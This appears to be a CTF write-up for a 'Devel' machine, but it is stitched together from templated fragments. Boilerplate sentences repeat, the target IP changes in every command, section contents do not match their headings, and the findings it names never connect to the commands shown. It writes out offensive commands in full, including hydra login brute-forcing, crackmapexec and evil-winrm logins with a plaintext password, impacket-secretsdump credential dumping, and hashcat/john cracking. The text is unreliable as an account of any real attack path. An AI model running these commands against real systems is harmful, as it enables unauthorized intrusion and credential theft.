---
TitleSEO: "VulnHub — Devel (Hard Windows) | ZureFX"
TitlePost: "VulnHub — Devel (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Devel. Pass the Ticket and AlwaysInstallElevated to achieve hard compromise on Windows."
Keywords: "insane, windows, ctf, forensics, linux, tryhackme, hard"
URL: "https://zurefx.github.io/writeups/htb-devel-524.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-devel-524/"
Date: "2024-10-21"
Tags: "Insane, Windows, CTF, Forensics, Linux, TryHackMe, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-devel-524"
Permalink: "/writeups/htb-devel-524.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Devel** is rated **Hard** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.50.27.244`.

### Objectives

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.86.110.165 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.74.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.182.58 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p80,1433,389 10.71.205.220 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.95.125.84/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```bash
gobuster dir -u http://10.18.116.247/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.120.244.209 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Pass the Ticket**.

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
crackmapexec smb 10.30.191.16 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.111.246.158/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.227.161/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.123.138 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
nmap -sCV -p443,22,8888 10.33.25.165 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.70.183.154 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.211.154
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.194.99 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `smbexec`
- `impacket`
- `burpsuite`
- `ldapsearch`
- `secretsdump`

### Key Takeaways

- Pass the Ticket
- AlwaysInstallElevated
